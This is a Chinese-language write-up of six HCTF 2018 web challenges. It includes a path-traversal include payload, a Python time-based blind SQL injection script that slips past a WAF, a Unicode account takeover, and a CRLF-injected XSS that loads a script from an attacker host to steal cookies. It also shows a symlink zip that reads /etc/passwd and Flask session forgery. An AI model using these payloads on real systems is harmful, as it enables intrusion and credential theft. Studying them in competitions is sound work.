# HCTF2018-WEB-详细Write up

阅读量 **382830**

|评论 **15**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-11-12 16:16:38

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01fc007d03b609e2fa.png)

良心比赛，这次的web题质量很高，做的很爽，跟着Delta的师傅们也学到了不少东西，发现自己还是tcl跟大佬们差得很远。

## Warmup

参考：https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/
根据提示找到source.php

    
    
    <?php
        class emmm
        {
            public static function checkFile(&$page)
            {
                $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
                if (! isset($page) || !is_string($page)) {
                    echo "you can't see it";
                    return false;
                }
    
                if (in_array($page, $whitelist)) {
                    return true;
                }
    
                $_page = mb_substr(
                    $page,
                    0,
                    mb_strpos($page . '?', '?')
                );
                if (in_array($_page, $whitelist)) {
                    return true;
                }
    
                $_page = urldecode($page);
                $_page = mb_substr(
                    $_page,
                    0,
                    mb_strpos($_page . '?', '?')
                );
                if (in_array($_page, $whitelist)) {
                    return true;
                }
                echo "you can't see it";
                return false;
            }
        }
    
        if (! empty($_REQUEST['file'])
            && is_string($_REQUEST['file'])
            && emmm::checkFile($_REQUEST['file'])
        ) {
            include $_REQUEST['file'];
            exit;
        } else {
            echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
        }  
    ?>

要使emmm::checkFile($_REQUEST[‘file’])返回true，可以利用?截取hint.php，然后利用/使hint.php?成为一个不存在的目录，最后include利用../../跳转目录读取flag。
payload：index.php?file=source.php?/../../../../../../../../../../../ffffllllaaaagggg或者index.php?file=hint.php?/../../../../../../../../../../../ffffllllaaaagggg。

## kzone

这道题做的是真爽 打开题目链接发现会跳转到qq登陆的页面。 抓包把响应包中的location删掉，可以发现一个钓鱼页面

![](https://p3.ssl.qhimg.com/t01e13e4a828ffaad2c.png)

![](https://p0.ssl.qhimg.com/t01fb6b8c28d1fa0b6d.png)

扫目录发现这个钓鱼站的www.zip备份文件还有后台管理页面admin/login.php。 数据库文件中的admin密码尝试登陆后台无果
对这两个登陆页面的源码2018.php和login.php进行审计。 都包含了./include/common.php这个文件

    
    
    <?php
        
    error_reporting(0);
    header('Content-Type: text/html; charset=UTF-8');
    define('IN_CRONLITE', true);
    define('ROOT', dirname(__FILE__).'/');
    define('LOGIN_KEY', 'abchdbb768526');
    date_default_timezone_set("PRC");
    $date = date("Y-m-d H:i:s");
    session_start();
    
    include ROOT.'../config.php';
    
    if(!isset($port))$port='3306';
    include_once(ROOT."db.class.php");
    $DB=new DB($host,$user,$pwd,$dbname,$port);
    
    $password_hash='!@#%!s!';
    require_once "safe.php";
    require_once ROOT."function.php";
    require_once ROOT."member.php";
    require_once ROOT."os.php";
    require_once ROOT."kill.intercept.php";
    ?>

里面的safe.php会对请求的get，post，cookie进行过滤。

    
    
    <?php
    function waf($string)
    {
        $blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|<|>|\#|\s/i';
        return preg_replace_callback($blacklist, function ($match) {
            return '@' . $match[0] . '@';
        }, $string);
    }

并且username和password都经过了addslashes函数转义，不存在宽字节注入，无法逃逸掉单引号。
大师傅提示member.php中json反序列化存在注入点。

![](https://p4.ssl.qhimg.com/t013b2387b7f7c9e7a7.png)

但是进入member.php的前提是IN_CRONLITE=1，所以要通过common.php进入member.php，但是common.php里面把get,post,cookie的内容给waf了。
但是我发现这里存在弱类型比较

    
    
    $admin_pass = sha1($udata['password'] . LOGIN_KEY);
    if ($admin_pass == $login_data['admin_pass']) {
        $islogin = 1;
    }

password是从$udata中获取的，不需要已知。尝试构造login_data={“admin_user”:”admin”,”admin_pass”:1}，对1所在的位置进行爆破，当admin_pass=65时，可以绕过，但是并不能登陆进去，可能是没有写入cookie，因此放弃了这个思路。

![](https://p0.ssl.qhimg.com/t01b695a376c0cf7e66.png)

所以只能从绕waf入手了，大师傅提示jsondecode会解编码
参考：<http://blog.sina.com.cn/s/blog_1574497330102wruv.html>
这里的cookie参数是先经过waf后被json解码的，因此可以用js编码绕过waf，对cookie中的admin_user进行注入发现可以注入。

![](https://p3.ssl.qhimg.com/t01d0a7406e642cf130.png)

这里踩了个坑，python3会对unicode编码自动解码，需要转义一下，python2不需要。

    
    
    # -*- coding: utf-8 -*-    import requests
    import string
    
    
    url = 'http://kzone.2018.hctf.io/include/common.php'
    str1 = string.ascii_letters+string.digits+'{}!@#$*&_,'
    
    
    def check(payload):
        cookie={
            'PHPSESSID':'8ehnp28ccr4ueh3gnfc3uqtau1',
            'islogin':'1',
            'login_data':payload
        }
        try:
            requests.get(url,cookies=cookie,timeout=3)
            return 0
        except:
            return 1
    
    result=''
    for i in range(1,33):
        for j in str1:
            #payload='{"admin_user":"admin\'and/**/\\u0069f(\\u0073ubstr((select/**/table_name/**/from/**/inf\\u006Frmation_schema.tables/**/where/**/table_schema\\u003Ddatabase()/**/limit/**/0,1),%d,1)\\u003D\'%s\',\\u0073leep(3),0)/**/and/**/\'1","admin_pass":65}'%(i,j)
            payload = '{"admin_user":"admin\'/**/and/**/\\u0069f(\\u0061scii(\\u0073ubstr((select/**/F1a9/**/from/**/F1444g),%s,1))\\u003d%s,\\u0073leep(4),1)/**/and/**/\'1","admin_pass":"123"}'% (str(i),ord(j))      
            #print('[+]'+payload)
            if check(payload):     
                result += j
                break
        print(result)

![](https://p2.ssl.qhimg.com/t01c59f0888fa6438a5.png)

## admin

源码藏在更改密码页面，23333。做了好久才发现。

![](https://p2.ssl.qhimg.com/t011a9838e84fe94b17.png)

源码里有一个脚本，可以知道服务器每30秒会重置一次数据库。 简单的flask框架，对路由routes.py审计
注册，登陆，更改密码都用到了strlower()这个函数。
接下来的操作参考[Unicode安全](http://blog.lnyas.xyz/?p=1411)

![](https://p5.ssl.qhimg.com/t010acd6b71f8dc1561.png)

注册的用户名经过strlower后才与已有的用户名进行比较。

![](https://p2.ssl.qhimg.com/t0109f51089bc019aa6.png)

在change密码这里，更改密码之前又经过了一次strower

![](https://p0.ssl.qhimg.com/t01c1054d9fd6eecb31.png)

注册一个ᴬdmin用户，登陆可以看到第一次strower把ᴬdmin变成了Admin，与admin不同所以注册成功。

![](https://p1.ssl.qhimg.com/t01be10ea0b68e77116.png)

然后更改密码，这里是第二次strower操作，Aadmin会变成admin，最终更改的是admin的密码。 最后退出，再用正常的admin登陆即可

![](https://p4.ssl.qhimg.com/t01790539ffb879f8e1.png)

## bottle

参考P牛写的:[Bottle HTTP 头注入漏洞探究](https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html)

首先在注册和登陆处发现CLRF 第一天的响应包

![](https://p2.ssl.qhimg.com/t010ee9208e46ecfe78.png)

第二天的响应包

![](https://p0.ssl.qhimg.com/t01103c973acc2e3c76.png)

刚开始的时候，CSP是在响应包的上面的，需要想办法绕过CSP。最后伟哥告诉我那个hint1不是机器人访问的crontab，是bottle这个框架重启的crontab。bottle这个框架好像有一个特性，每次重启的时候可以bypass掉CSP。但是出题人好像第二天发现这个bypass思路自己都复现不了，所以就把CSP设置到响应包下面了。
接下来就简单了，只需要绕过302跳转就可以打到cookie。因为302的时候不会xss。利用<80端口可以绕过302跳转。可以在浏览器手动试一下。
80端口的时候

![](https://p5.ssl.qhimg.com/t019bc9c8888d4e662f.png)

22 端口的时候，这个时候手动访问可以看到打到了cookie。

![](https://p3.ssl.qhimg.com/t01c3231280f50efbe4.png)

所以拿着下面这个payload就可以打到cookie了。

    
    
    http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:20/%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src=http://yourvps/myjs/cookie.js%3E%3C/script%3E

![](https://p4.ssl.qhimg.com/t010448c6f6980d09c3.png)

改cookie登陆

![](https://p5.ssl.qhimg.com/t0166804e359160dcbc.png)

## hide and seek

软连接任意文件读取参考：[一个有趣的任意文件读取](https://xz.aliyun.com/t/2589)

ln -s /etc/passwd link

zip -y test.zip link

![](https://p4.ssl.qhimg.com/t01a6ce15164b50a766.png)

提示了docker，尝试读取/proc/self/environ中的环境变量。

    
    
    UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=c5a8715244dbSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0

发现ini文件/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini，继续读取
找到了

    
    
    [uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app 

继续读/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py的源码

    
    
    # -*- coding: utf-8 -*-    from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
    import uuid
    import base64
    import random
    import flag
    from werkzeug.utils import secure_filename
    import os
    random.seed(uuid.getnode())
    app = Flask(__name__)
    app.config['SECRET_KEY'] = str(random.random()*100)
    app.config['UPLOAD_FOLDER'] = './uploads'
    app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
    ALLOWED_EXTENSIONS = set(['zip'])
    
    def allowed_file(filename):
        return '.' in filename and \
               filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
    
    
    @app.route('/', methods=['GET'])
    def index():
        error = request.args.get('error', '')
        if(error == '1'):
            session.pop('username', None)
            return render_template('index.html', forbidden=1)
    
        if 'username' in session:
            return render_template('index.html', user=session['username'], flag=flag.flag)
        else:
            return render_template('index.html')
    
    
    @app.route('/login', methods=['POST'])
    def login():
        username=request.form['username']
        password=request.form['password']
        if request.method == 'POST' and username != '' and password != '':
            if(username == 'admin'):
                return redirect(url_for('index',error=1))
            session['username'] = username
        return redirect(url_for('index'))
    
    
    @app.route('/logout', methods=['GET'])
    def logout():
        session.pop('username', None)
        return redirect(url_for('index'))
    
    @app.route('/upload', methods=['POST'])
    def upload_file():
        if 'the_file' not in request.files:
            return redirect(url_for('index'))
        file = request.files['the_file']
        if file.filename == '':
            return redirect(url_for('index'))
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            if(os.path.exists(file_save_path)):
                return 'This file already exists'
            file.save(file_save_path)
        else:
            return 'This file is not a zipfile'
    
    
        try:
            extract_path = file_save_path + '_'
            os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
            read_obj = os.popen('cat ' + extract_path + '/*')
            file = read_obj.read()
            read_obj.close()
            os.system('rm -rf ' + extract_path)
        except Exception as e:
            file = None
    
        os.remove(file_save_path)
        if(file != None):
            if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
                return redirect(url_for('index', error=1))
        return Response(file)
    
    
    if __name__ == '__main__':
        #app.run(debug=True)
        app.run(host='127.0.0.1', debug=True, port=10008)

尝试读取flag.py，且没有flag.pyc

![](https://p5.ssl.qhimg.com/t0153add00445978455.png)

读取index.html发现只有admin可以看到flag

    
    
    {% if user == 'admin' %}
    Your flag: <br>
    {{ flag  }}
    {% else %}

且无法用admin登陆，想到需要伪造session。

![](https://p4.ssl.qhimg.com/t01220e484f450f9052.png)

随机数种子由uuid.getnode()获得为固定mac地址

    
    
    random.seed(uuid.getnode())
    app.config['SECRET_KEY'] = str(random.random()*100)

读取mac地址/sys/class/net/eth0/address

    
    
    12:34:3e:14:7c:62 
    
    >>> 0x12343e147c62
    20015589129314

从开始读取到的环境变量里面知道python版本PYTHON_VERSION=3.6.6
python3下用上面的随机数种子本地生成admin的session。

![](https://p0.ssl.qhimg.com/t010f09d2f070403ff4.png)

更改session即可登陆admin获得flag。

![](https://p1.ssl.qhimg.com/t014dbe8483b87fdaec.png)

## game

神注入，思路如下 首先知道flag.php只有admin才能访问，提示注入，所以这道题应该就是要注入出admin密码并登陆。
http://game.2018.hctf.io/web2/user.php?order=password可以根据密码进行排序
我们可以不断注册新用户，密码逐位与admin的密码比较，最最终比较出来admin密码。 且从order=id知道order by为降序排列

![](https://p5.ssl.qhimg.com/t010c52c5357347190b.png)

比如注册一个密码为d的用户

![](https://p1.ssl.qhimg.com/t017aa9157c85e89922.png)

order by password排序

![](https://p4.ssl.qhimg.com/t01e50cf4d607117ca6.png)

发现它在admin下面

![](https://p4.ssl.qhimg.com/t01acb3c94b1d6a436f.png)

再注册一个密码为e的用户

![](https://p0.ssl.qhimg.com/t013b8b76365565359f.png)

发现他在admin上面

![](https://p1.ssl.qhimg.com/t01e8d2bb89e56aace1.png)

由此可以推算出admin密码第一位是d，按照此原理，逐位得到完整的admin密码为dsa8&&!@#$%^&d1ngy1as3dja
登录访问flag.php即可

![](https://p1.ssl.qhimg.com/t0129174b14927f602e.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Smi1e** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/163974](/post/id/163974)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [Web安全](/tag/Web安全)
  * [hctf](/tag/hctf)

 **+1** __17赞

 __收藏

![](https://p5.ssl.qhimg.com/t010d9349529890bcdc.png) Smi1e

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

